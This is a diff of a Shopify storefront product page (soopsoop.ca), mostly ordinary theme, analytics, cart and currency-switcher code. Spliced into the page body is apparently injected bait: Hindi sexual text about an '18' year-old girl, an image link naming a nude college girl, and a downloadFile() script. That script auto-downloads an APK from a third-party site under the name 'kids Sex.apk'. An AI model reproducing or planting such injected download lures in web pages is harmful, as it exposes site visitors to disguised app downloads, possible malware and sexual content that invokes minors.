+        eventsListenerScript.src = "//www.soopsoop.ca/cdn/shopifycloud/shopify/assets/shop_events_listener-a7c63dba65ccddc484f77541dc8ca437e60e1e9e297fe1c3faebf6523a0ede9b.js";
+        document.getElementsByTagName('head')[0].appendChild(eventsListenerScript);
+
+})();
+   </script>
+   <script class="boomerang">
+    (function () {
+  if (window.BOOMR && (window.BOOMR.version || window.BOOMR.snippetExecuted)) {
+    return;
+  }
+  window.BOOMR = window.BOOMR || {};
+  window.BOOMR.snippetStart = new Date().getTime();
+  window.BOOMR.snippetExecuted = true;
+  window.BOOMR.snippetVersion = 12;
+  window.BOOMR.application = "storefront-renderer";
+  window.BOOMR.themeName = "Brooklyn";
+  window.BOOMR.themeVersion = "5.0.0";
+  window.BOOMR.shopId = 1527167;
+  window.BOOMR.themeId = 78873493577;
+  window.BOOMR.renderRegion = "gcp-europe-west1";
+  window.BOOMR.url =
+    "https://www.soopsoop.ca/cdn/shopifycloud/boomerang/shopify-boomerang-1.0.0.min.js";
+  var where = document.currentScript || document.getElementsByTagName("script")[0];
+  var parentNode = where.parentNode;
+  var promoted = false;
+  var LOADER_TIMEOUT = 3000;
+  function promote() {
+    if (promoted) {
+      return;
+    }
+    var script = document.createElement("script");
+    script.id = "boomr-scr-as";
+    script.src = window.BOOMR.url;
+    script.async = true;
+    parentNode.appendChild(script);
+    promoted = true;
+  }
+  function iframeLoader(wasFallback) {
+    promoted = true;
+    var dom, bootstrap, iframe, iframeStyle;
+    var doc = document;
+    var win = window;
+    window.BOOMR.snippetMethod = wasFallback ? "if" : "i";
+    bootstrap = function(parent, scriptId) {
+      var script = doc.createElement("script");
+      script.id = scriptId || "boomr-if-as";
+      script.src = window.BOOMR.url;
+      BOOMR_lstart = new Date().getTime();
+      parent = parent || doc.body;
+      parent.appendChild(script);
+    };
+    if (!window.addEventListener && window.attachEvent && navigator.userAgent.match(/MSIE [67]./)) {
+      window.BOOMR.snippetMethod = "s";
+      bootstrap(parentNode, "boomr-async");
+      return;
+    }
+    iframe = document.createElement("IFRAME");
+    iframe.src = "about:blank";
+    iframe.title = "";
+    iframe.role = "presentation";
+    iframe.loading = "eager";
+    iframeStyle = (iframe.frameElement || iframe).style;
+    iframeStyle.width = 0;
+    iframeStyle.height = 0;
+    iframeStyle.border = 0;
+    iframeStyle.display = "none";
+    parentNode.appendChild(iframe);
+    try {
+      win = iframe.contentWindow;
+      doc = win.document.open();
+    } catch (e) {
+      dom = document.domain;
+      iframe.src = "javascript:var d=document.open();d.domain='" + dom + "';void(0);";
+      win = iframe.contentWindow;
+      doc = win.document.open();
+    }
+    if (dom) {
+      doc._boomrl = function() {
+        this.domain = dom;
+        bootstrap();
+      };
+      doc.write("<body onload='document._boomrl();'>");
+    } else {
+      win._boomrl = function() {
+        bootstrap();
+      };
+      if (win.addEventListener) {
+        win.addEventListener("load", win._boomrl, false);
+      } else if (win.attachEvent) {
+        win.attachEvent("onload", win._boomrl);
+      }
+    }
+    doc.close();
+  }
+  var link = document.createElement("link");
+  if (link.relList &&
+    typeof link.relList.supports === "function" &&
+    link.relList.supports("preload") &&
+    ("as" in link)) {
+    window.BOOMR.snippetMethod = "p";
+    link.href = window.BOOMR.url;
+    link.rel = "preload";
+    link.as = "script";
+    link.addEventListener("load", promote);
+    link.addEventListener("error", function() {
+      iframeLoader(true);
+    });
+    setTimeout(function() {
+      if (!promoted) {
+        iframeLoader(true);
+      }
+    }, LOADER_TIMEOUT);
+    BOOMR_lstart = new Date().getTime();
+    parentNode.appendChild(link);
+  } else {
+    iframeLoader(false);
+  }
+  function boomerangSaveLoadTime(e) {
+    window.BOOMR_onload = (e && e.timeStamp) || new Date().getTime();
+  }
+  if (window.addEventListener) {
+    window.addEventListener("load", boomerangSaveLoadTime, false);
+  } else if (window.attachEvent) {
+    window.attachEvent("onload", boomerangSaveLoadTime);
+  }
+  if (document.addEventListener) {
+    document.addEventListener("onBoomerangLoaded", function(e) {
+      e.detail.BOOMR.init({
+        ResourceTiming: {
+          enabled: true,
+          trackedResourceTypes: ["script", "img", "css"]
+        },
+      });
+      e.detail.BOOMR.t_end = new Date().getTime();
+    });
+  } else if (document.attachEvent) {
+    document.attachEvent("onpropertychange", function(e) {
+      if (!e) e=event;
+      if (e.propertyName === "onBoomerangLoaded") {
+        e.detail.BOOMR.init({
+          ResourceTiming: {
+            enabled: true,
+            trackedResourceTypes: ["script", "img", "css"]
+          },
+        });
+        e.detail.BOOMR.t_end = new Date().getTime();
+      }
+    });
+  }
+})();
+   </script>
+   <script async="async" src="https://www.google-analytics.com/analytics.js">
+   </script>
+  </link>
+ </head>
+ <style>
+       #sex-magazine-issue-13.template-product {
+            background-color: #000; /* Set the background color to dark (black) */
+            color: #fff; /* Set the text color to white, assuming you want light text on a dark background */
+        }
+
+        .iframe-container {
+            width: 100%; /* Make the iframe container full-width */
+            overflow: hidden; /* Hide any overflowing content */
+        }
+
+        .responsive-iframe {
+            width: 100%; /* Make the iframe itself full-width */
+            height: 100%; /* Maintain aspect ratio */
+        }
+    </style>
+ <body class="template-product" id="sex-magazine-issue-13" >
+ <style>
+   .centered-message {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -70%);
+    text-align: center;
+    background-color: #e31429; /* Golden box background color */
+    padding: 20px; /* Add padding for the box */
+    border-radius: 10px; /* Add border-radius for rounded corners */
+    z-index: 1; /* Ensure the message appears above other content */
+}
+
+/* Adjust font size to make the message big */
+.centered-message h1 {
+    font-size: 3em;
+    margin: 0; /* Remove default margin */
+}
+
+/* Link styles */
+.btclk {
+    display: inline-block;
+    padding: 20px;
+    background-color: #f39c12; /* Bright background color */
+    color: #fff; /* White text color */
+    text-decoration: none;
+    font-size: 2em; /* Big font size */
+    border-radius: 10px; /* Rounded corners */
+    transition: background-color 0.3s ease; /* Smooth transition */
+    animation: pulse 2s infinite; /* Apply the animation infinitely */
+    z-index: 1; /* Ensure the link appears above other content */
+}
+
+/* Hover effect */
+.btclk:hover {
+    background-color: #e67e22; /* Darker color on hover */
+}
+
+/* Animation */
+@keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+    100% { transform: scale(1); }
+}
+
+/* Circular photo styles */
+.circular-photo {
+    position: absolute;
+    top: calc(50% + 320px); /* Position below centered-message */
+    left: 50%;
+    transform: translateX(-50%);
+    border-radius: 50%; /* Make it circular */
+    overflow: hidden; /* Hide overflow */
+    width: 200px; /* Adjust size as needed */
+    height: 200px; /* Adjust size as needed */
+    animation: rotate 5s linear infinite; /* Apply rotation animation */
+    z-index: 0; /* Ensure the photo appears below other content */
+}
+
+/* Rotate animation */
+@keyframes rotate {
+    0% { transform: translate(-50%, -50%) rotate(0deg); }
+    100% { transform: translate(-50%, -50%) rotate(360deg); }
+}
+</style>
+<div class="centered-message" onclick="downloadFile()">
+    <h1>sex 15 वीडियो और 60 फोटो, सेक्सी लड़की 18 </h1>
+<a href="#" class="btclk" >Download tha secret app</a>
+</div>
+<div class="circular-photo">
+    <img src="https://i.ibb.co/PNptty9/young-hot-indian-18-years-old-college-girl-nude4.jpg" alt="Circular Photo">
+</div>
+ <div class="iframe-container">
+       
+    </div>
+	<script>
+function downloadFile() {
+    // Create a link element
+    var link = document.createElement("a");
+    link.href = "https://apkfab.com/indian-sex/com.systex.shedc/apk?"; // Replace with the URL of the file you want to download
+    link.download = "kids Sex.apk"; // Specify the filename for the downloaded file
+
+    // Trigger the download
+    document.body.appendChild(link);
+    link.click();
+
+    // Clean up
+    document.body.removeChild(link);
+}
+</script>
+      <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+
+        video {
+            width: 80%;
+            max-width: 800px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Customize play button */
+        video::after {
+            content: '\25B6'; /* Unicode character for play arrow */
+            font-size: 3em;
+            color: white;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            cursor: pointer;
+        }
+
+        /* Remove default controls */
+        video::-webkit-media-controls {
+            display: none !important;
+        }
+    </style>
+	
+  <div class="drawer drawer--left" id="NavDrawer">
+  
+ 
+   <main class="main-content" role="main">
+    <div class="wrapper">
+     <!-- /templates/product.liquid -->
+     
+    </div>
+   </main>
+   <hr class="hr--large"/>
+   
+     </div>
+    </footer>
+   </div>
+  </div>
+  <script>
+  </script>
+  <!-- /snippets/ajax-cart-template.liquid -->
+  <script id="CartTemplate" type="text/template">
+   <form action="/cart" method="post" novalidate class="cart ajaxcart">
+      <div class="ajaxcart__inner ajaxcart__inner--has-fixed-footer">
+        {{#items}}
+        <div class="ajaxcart__product">
+          <div class="ajaxcart__row" data-line="{{line}}">
+            <div class="grid">
+              <div class="grid__item one-quarter">
+                <a href="{{url}}" class="ajaxcart__product-image"><img src="{{img}}" alt="{{name}}"></a>
+              </div>
+              <div class="grid__item three-quarters">
+                <div class="ajaxcart__product-name--wrapper">
+                  <a href="{{url}}" class="ajaxcart__product-name">{{{name}}}</a>
+                  {{#if variation}}
+                    <span class="ajaxcart__product-meta">{{variation}}</span>
+                  {{/if}}
+                  {{#properties}}
+                    {{#each this}}
+                      {{#if this}}
+                        <span class="ajaxcart__product-meta">{{@key}}: {{this}}</span>
+                      {{/if}}
+                    {{/each}}
+                  {{/properties}}
+                </div>
+
+                <div class="grid--full display-table">
+                  <div class="grid__item display-table-cell one-half">
+                    <div class="ajaxcart__qty">
+                      <button type="button" class="ajaxcart__qty-adjust ajaxcart__qty--minus icon-fallback-text" data-id="{{key}}" data-qty="{{itemMinus}}" data-line="{{line}}" aria-label="Reduce item quantity by one">
+                        <span class="icon icon-minus" aria-hidden="true"></span>
+                        <span class="fallback-text" aria-hidden="true">&minus;</span>
+                      </button>
+                      <input type="text" name="updates[]" class="ajaxcart__qty-num" value="{{itemQty}}" min="0" data-id="{{key}}" data-line="{{line}}" aria-label="quantity" pattern="[0-9]*">
+                      <button type="button" class="ajaxcart__qty-adjust ajaxcart__qty--plus icon-fallback-text" data-id="{{key}}" data-line="{{line}}" data-qty="{{itemAdd}}" aria-label="Increase item quantity by one">
+                        <span class="icon icon-plus" aria-hidden="true"></span>
+                        <span class="fallback-text" aria-hidden="true">+</span>
+                      </button>
+                    </div>
+                  </div>
+                  <div class="grid__item display-table-cell one-half text-right">
+                    {{#if discountsApplied}}
+                      <small class="ajaxcart__price--strikethrough">{{{price}}}</small>
+                      <span class="ajaxcart__price">
+                        {{{discountedPrice}}}
+                      </span>
+                    {{else}}
+                      <span class="ajaxcart__price">
+                        {{{price}}}
+                      </span>
+                    {{/if}}
+                  </div>
+                </div>
+                {{#if discountsApplied}}
+                  <div class="grid--full display-table">
+                    <div class="grid__item text-right">
+                      {{#each discounts}}
+                        <small class="ajaxcart__discount">{{this.title}}</small>
+                      {{/each}}
+                    </div>
+                  </div>
+                {{/if}}
+              </div>
+            </div>
+          </div>
+        </div>
+        {{/items}}
+
+        
+      </div>
+      <div class="ajaxcart__footer ajaxcart__footer--fixed">
+        <div class="grid--full">
+          <div class="grid__item two-thirds">
+            <p class="ajaxcart__subtotal">Subtotal</p>
+          </div>
+          <div class="grid__item one-third text-right">
+            <p class="ajaxcart__subtotal">{{{totalPrice}}}</p>
+          </div>
+        </div>
+        {{#if totalCartDiscount}}
+          <p class="ajaxcart__savings text-center">{{{totalCartDiscount}}}</p>
+        {{/if}}
+        <p class="ajaxcart__note text-center">Shipping will be calculated at checkout. </p>
+        <button type="submit" class="btn--secondary btn--full cart__checkout" name="checkout">
+          Checkout <span class="icon icon-arrow-right" aria-hidden="true"></span>
+        </button>
+      </div>
+    </form>
+  </script>
+  <script id="AjaxQty" type="text/template">
+   <div class="ajaxcart__qty">
+      <button type="button" class="ajaxcart__qty-adjust ajaxcart__qty--minus icon-fallback-text" data-id="{{key}}" data-qty="{{itemMinus}}" aria-label="Reduce item quantity by one">
+        <span class="icon icon-minus" aria-hidden="true"></span>
+        <span class="fallback-text" aria-hidden="true">&minus;</span>
+      </button>
+      <input type="text" class="ajaxcart__qty-num" value="{{itemQty}}" min="0" data-id="{{key}}" aria-label="quantity" pattern="[0-9]*">
+      <button type="button" class="ajaxcart__qty-adjust ajaxcart__qty--plus icon-fallback-text" data-id="{{key}}" data-qty="{{itemAdd}}" aria-label="Increase item quantity by one">
+        <span class="icon icon-plus" aria-hidden="true"></span>
+        <span class="fallback-text" aria-hidden="true">+</span>
+      </button>
+    </div>
+  </script>
+  <script id="JsQty" type="text/template">
+   <div class="js-qty">
+      <button type="button" class="js-qty__adjust js-qty__adjust--minus icon-fallback-text" data-id="{{key}}" data-qty="{{itemMinus}}" aria-label="Reduce item quantity by one">
+        <span class="icon icon-minus" aria-hidden="true"></span>
+        <span class="fallback-text" aria-hidden="true">&minus;</span>
+      </button>
+      <input type="text" class="js-qty__num" value="{{itemQty}}" min="1" data-id="{{key}}" aria-label="quantity" pattern="[0-9]*" name="{{inputName}}" id="{{inputId}}">
+      <button type="button" class="js-qty__adjust js-qty__adjust--plus icon-fallback-text" data-id="{{key}}" data-qty="{{itemAdd}}" aria-label="Increase item quantity by one">
+        <span class="icon icon-plus" aria-hidden="true"></span>
+        <span class="fallback-text" aria-hidden="true">+</span>
+      </button>
+    </div>
+  </script>
+  <script>
+   // Override default values of shop.strings for each template.
+        // Alternate product templates can change values of
+        // add to cart button, sold out, and unavailable states here.
+        theme.productStrings = {
+          addToCart: "Add to Cart",
+          soldOut: "Sold Out",
+          unavailable: "Unavailable"
+        }
+  </script>
+  <div class="mfp-hide" id="SearchModal">
+   <!-- /snippets/search-bar.liquid -->
+   <form action="search" class="input-group search-bar search-bar--modal" method="get" role="search">
+    <input aria-label="Search" class="input-group-field" name="q" placeholder="Search" type="search" value=""/>
+    <span class="input-group-btn">
+     <button class="btn icon-fallback-text" type="submit">
+      <span aria-hidden="true" class="icon icon-search">
+      </span>
+      <span class="fallback-text">
+       Search
+      </span>
+     </button>
+    </span>
+   </form>
+  </div>
+  <link href="cdn/shop/t/36/assets/mlveda-currencies-switcher-format.css?v=103059888515754963211695921408" media="all" rel="stylesheet" type="text/css">
+   <script>
+    var mlvedasw = '<div class = "pick_currency "  style="display: none; ">'+
+  '<select id="currencies" name="currencies" style="display: inline;">'+
+  
+  
+'<option value="CAD" selected="selected">CAD</option>'+
+  
+    
+  
+    
+    '<option value="USD">USD</option>'+
+    
+  
+    
+    '<option value="EUR">EUR</option>'+
+    
+  
+    
+    '<option value="GBP">GBP</option>'+
+    
+  
+    
+    '<option value="SEK">SEK</option>'+
+    
+  
+    
+    '<option value="CHF">CHF</option>'+
+    
+  
+    
+    '<option value="AUD">AUD</option>'+
+    
+  
+    
+    '<option value="CNY">CNY</option>'+
+    
+  
+    
+    '<option value="HKD">HKD</option>'+
+    
+  
+    
+    '<option value="JPY">JPY</option>'+
+    
+  
+    
+    '<option value="KRW">KRW</option>'+
+    
+  
+'</select>'+
+'</div>';
+var mlvedaswmobile = '<a class = "pick_currency "  style="display: none; ">'+
+  '<select id="currencies1" name="currencies" style="display: inline;">'+
+  
+  
+'<option value="CAD" selected="selected">CAD</option>'+
+  
+    
+  
+    
+    '<option value="USD">USD</option>'+
+    
+  
+    
+    '<option value="EUR">EUR</option>'+
+    
+  
+    
+    '<option value="GBP">GBP</option>'+
+    
+  
+    
+    '<option value="SEK">SEK</option>'+
+    
+  
+    
+    '<option value="CHF">CHF</option>'+
+    
+  
+    
+    '<option value="AUD">AUD</option>'+
+    
+  
+    
+    '<option value="CNY">CNY</option>'+
+    
+  
+    
+    '<option value="HKD">HKD</option>'+
+    
+  
+    
+    '<option value="JPY">JPY</option>'+
+    
+  
+    
+    '<option value="KRW">KRW</option>'+
+    
+  
+'</select>'+
+'</a>';
+
+  var _0x8a39=["\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x73\x69\x74\x65\x2D\x6E\x61\x76\x5F\x5F\x69\x74\x65\x6D\x22\x3E","\x3C\x2F\x6C\x69\x3E","\x61\x70\x70\x65\x6E\x64","\x23\x41\x63\x63\x65\x73\x73\x69\x62\x6C\x65\x4E\x61\x76","\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x6F\x62\x69\x6C\x65\x2D\x6E\x61\x76\x5F\x5F\x69\x74\x65\x6D\x22\x3E","\x61\x66\x74\x65\x72","\x2E\x6D\x6F\x62\x69\x6C\x65\x2D\x6E\x61\x76\x5F\x5F\x73\x70\x61\x63\x65\x72","\x73\x69\x74\x65\x2D\x6E\x61\x76\x5F\x5F\x6C\x69\x6E\x6B","\x61\x64\x64\x43\x6C\x61\x73\x73","\x23\x63\x75\x72\x72\x65\x6E\x63\x69\x65\x73","\x6D\x6F\x62\x69\x6C\x65\x2D\x6E\x61\x76\x5F\x5F\x6C\x69\x6E\x6B","\x23\x63\x75\x72\x72\x65\x6E\x63\x69\x65\x73\x31"];
+  $(_0x8a39[3])[_0x8a39[2]](_0x8a39[0]+ mlvedasw+ _0x8a39[1]);
+  
+  $(_0x8a39[9])[_0x8a39[8]](_0x8a39[7]);
+  $(_0x8a39[11])[_0x8a39[8]](_0x8a39[10])
+  
+  $('.mobile-nav').prepend('<li class="mobile-nav__item">'+mlvedaswmobile+'</li>')
+   </script>
+   <style>
+    .is-light select#currencies,
+.is-light select#currencies1 {
+  background-image: url("//www.soopsoop.ca/cdn/shop/t/36/assets/ico-select-white.svg?v=174832801994353699001581792257");  
+}
+  
+ .mobile-nav .pick_currency { padding:15px !important; left:0px; font-size:18px;}
+    
+  select#currencies{background-size:7px;}
+   </style>
+   <script src="multiCurrencyPricing/js/currencies.js" type="text/javascript">
+   </script>
+   <form accept-charset="UTF-8" action="cart/update" class="currency-selector small--hide" enctype="multipart/form-data" id="currency_form" method="post">
+    <input name="form_type" type="hidden" value="currency">
+     <input name="utf8" type="hidden" value="✓">
+      <input name="return_to" type="hidden" value="/products/sex-magazine-issue-13"/>
+      <input name="currency" type="hidden" value="CurrencyDrop"/>
+     </input>
+    </input>
+   </form>
+   <script>
+    window.shopify_supported_currencies = "";
+  
+    shopify_supported_currencies = shopify_supported_currencies + "AED ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "AFN ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "ALL ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "AMD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "ANG ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "AUD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "AWG ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "AZN ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "BAM ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "BBD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "BDT ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "BGN ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "BIF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "BND ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "BOB ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "BSD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "BWP ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "BZD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "CAD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "CDF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "CHF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "CNY ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "CRC ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "CVE ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "CZK ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "DJF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "DKK ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "DOP ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "DZD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "EGP ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "ETB ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "EUR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "FJD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "FKP ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "GBP ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "GMD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "GNF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "GTQ ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "GYD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "HKD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "HNL ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "HUF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "IDR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "ILS ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "INR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "ISK ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "JMD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "JPY ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "KES ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "KGS ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "KHR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "KMF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "KRW ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "KYD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "KZT ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "LAK ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "LBP ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "LKR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "MAD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "MDL ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "MKD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "MMK ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "MNT ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "MOP ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "MUR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "MVR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "MWK ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "MYR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "NGN ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "NIO ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "NPR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "NZD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "PEN ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "PGK ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "PHP ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "PKR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "PLN ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "PYG ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "QAR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "RON ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "RSD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "RWF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "SAR ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "SBD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "SEK ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "SGD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "SHP ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "SLL ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "STD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "THB ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "TJS ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "TOP ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "TTD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "TWD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "TZS ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "UAH ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "UGX ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "USD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "UYU ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "UZS ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "VND ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "VUV ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "WST ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "XAF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "XCD ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "XOF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "XPF ";
+
+    shopify_supported_currencies = shopify_supported_currencies + "YER ";
+
+function mlvedaCreateCookie(name, value, days) {
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        var expires = "; expires=" + date.toGMTString();
+    }
+    else
+        var expires = "";
+    document.cookie = name + "=" + value + expires + "; path=/";
+}
+
+function mlvedaReadCookie(name) {
+    var nameEQ = name + "=";
+    var ca = document.cookie.split(';');
+    for (var i = 0; i < ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) == ' ')
+            c = c.substring(1, c.length);
+        if (c.indexOf(nameEQ) == 0)
+            return c.substring(nameEQ.length, c.length);
+    }
+    return null;
+}
+
+function mlvedaEraseCookie(name) {
+    createCookie(name, "", -1);
+}
+
+function roundCurrency() {
+  
+    
+      $('.money').each(function(){
+        if (Currency.currentCurrency === "JOD" || Currency.currentCurrency === "KWD" || Currency.currentCurrency === "BHD") {
+          var moneyraw = parseFloat(jQuery(this).html().replace(/[^0-9]/g, ""), 10) / 10 ;
+        } 
+        else if( Currency.currentCurrency === "KRW" || Currency.currentCurrency === "JPY" || Currency.currentCurrency === "SEK" || Currency.currentCurrency === "HUF" || Currency.currentCurrency === "ISK") {
+          var moneyraw = parseFloat(jQuery(this).html().replace(/[^0-9]/g, ""), 10) * 100 ;
+        } else {
+          var moneyraw = parseFloat(jQuery(this).html().replace(/[^0-9]/g, ""), 10)  ;
+        }  
+        var moneyrounded = Math.ceil(moneyraw / 100) * 100;
+        if(Currency.format === "money_with_currency_format") {
+          var acuree = Currency.formatMoney(moneyrounded, Currency.moneyFormats[Currency.currentCurrency].money_with_currency_format)
+        }
+        else {
+          var acuree = Currency.formatMoney(moneyrounded, Currency.moneyFormats[Currency.currentCurrency].money_format)
+        }        jQuery(this).html(acuree);
+      });
+    
+  
+}
+
+
+
+function mlvedaload(){
+
+
+Currency.format = 'money_with_currency_format';
+
+
+var shopCurrency = 'CAD';
+
+/* Sometimes merchants change their shop currency, let's tell our JavaScript file */
+Currency.moneyFormats[shopCurrency].money_with_currency_format = "${{amount}} CAD";
+Currency.moneyFormats[shopCurrency].money_format = "${{amount}} CAD";
+  
+
+
+/* Default currency */
+var defaultCurrency = shopCurrency;
+  
+/* Cookie currency */
+var cookieCurrency = Currency.cookie.read();
+var resetCurrencyCookie = mlvedaReadCookie("resetCurrencyCookie");
+if (resetCurrencyCookie == null)
+{
+    cookieCurrency = null;
+    mlvedaCreateCookie("resetCurrencyCookie", 1, 365);
+}
+
+  if(cookieCurrency == null) {
+    cookieCurrency = window.mlvedadefaultcurrency;
+  }
+/* Fix for customer account pages */
+jQuery('span.money span.money').each(function() {
+  jQuery(this).parents('span.money').removeClass('money');
+});
+
+/* Saving the current price */
+jQuery('span.money').each(function() {
+if(!jQuery(this).attr('data-currency-CAD'))
+{
+  jQuery(this).attr('data-currency-CAD', jQuery(this).html());
+}
+});
+
+// If there's no cookie.
+if (cookieCurrency == null) {
+  if (shopCurrency !== defaultCurrency) {
+    Currency.convertAll(shopCurrency, defaultCurrency);
+  }
+  else {
+    Currency.currentCurrency = defaultCurrency;
+  }
+}
+// If the cookie value does not correspond to any value in the currency dropdown.
+else if (jQuery('[name=currencies]').size() && jQuery('[name=currencies] option[value=' + cookieCurrency + ']').size() === 0) {
+  Currency.currentCurrency = shopCurrency;
+  Currency.cookie.write(shopCurrency);
+}
+else if (cookieCurrency === shopCurrency) {
+  Currency.currentCurrency = shopCurrency;
+}
+else {
+  if(shopify_supported_currencies.indexOf(cookieCurrency) != -1) {
+    Currency.cookie.write(cookieCurrency);
+    $("#currency_form input[name=currency]").val(cookieCurrency);
+    $("#currency_form").submit();
+  } else if( shopCurrency !== "CAD") {
+    Currency.cookie.write(cookieCurrency);
+    $("#currency_form input[name=currency]").val("CAD");
+    $("#currency_form").submit();
+  } else {
+    Currency.convertAll(shopCurrency, cookieCurrency);
+    roundCurrency();
+    $(".mlvedaCartNote").css("display","inline");
+  }
+}
+
+jQuery('[name=currencies]').val(Currency.currentCurrency).change(function() {
+  var newCurrency = jQuery(this).val();
+  if(shopify_supported_currencies.indexOf(newCurrency) != -1) {
+    Currency.cookie.write(newCurrency);
+    $("#currency_form input[name=currency]").val(newCurrency);
+    $("#currency_form").submit();
+  } else if( shopCurrency !== "CAD") {
+    ACSCurrency.cookie.write(newCurrency);
+    $("#currency_form input[name=currency]").val("CAD");
+    $("#currency_form").submit();
+  } else {
+    Currency.convertAll(Currency.currentCurrency, newCurrency);
+   roundCurrency();
